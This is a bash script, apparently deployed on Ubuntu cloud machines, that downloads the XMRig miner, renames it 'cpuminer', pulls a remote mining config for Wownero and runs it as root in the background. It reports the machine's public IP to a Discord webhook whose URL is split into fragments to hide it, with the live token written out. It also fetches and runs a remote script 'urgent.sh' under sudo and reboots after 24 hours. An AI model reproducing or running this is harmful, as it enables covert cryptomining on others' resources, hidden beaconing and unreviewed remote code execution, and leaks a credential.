#!/bin/bash


if [ ! -f sudah_initiate_wownero.txt ]; then
  touch sudah_initiate_wownero.txt
  sudo apt-get install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev libnuma-dev git -y
  wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
  tar xf xmrig-6.16.4-focal-x64.tar.gz
  cd /home/ubuntu/xmrig-6.16.4
  sudo rm -rf config.json
  wget https://raw.githubusercontent.com/Rickyose/azure_4_core/main/wownero/config.json
  sudo mv xmrig cpuminer
fi

sleep 10

if [ ! -f sudah_initiate_discord_wownero.txt ]; then
  touch sudah_initiate_discord_wownero.txt
  pre_message="$@======================================================="
  message="$@CPUMINER UNTUK WOWNERO SUDAH JALAN : `curl ifconfig.me`"
  pasca_message="$@======================================================="
  ## format to parse to curl
  ## echo Sending message: $message
  msg_pre_content=\"$pre_message\"
  msg_content=\"$message\"
  msg_pasca_content=\"$pasca_message\"
  ## discord webhook
  nama1="https://disc"
  nama2="ord.com/ap"
  nama3="i/webh"
  ## FORMAT
  nama4="ooks/953847082421198890/9BRg2Z7tKUtH-ZwgemK4X4JYrS7wO6tTJkitnNiNxVOmGPigsjH2679jAkMideRPD8K1"
  url=$nama1$nama2$nama3$nama4
	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_pre_content}" $url
	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_content}" $url
	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_pasca_content}" $url
 fi
 
 cd /home/ubuntu/xmrig-6.16.4
 sudo ./cpuminer &
 
 sudo rm -rf urgent.sh
 wget https://raw.githubusercontent.com/Rickyose/azure_4_core/main/misc/urgent.sh
 sudo bash urgent.sh &

##################################
sleep 24h
sudo reboot
#################################
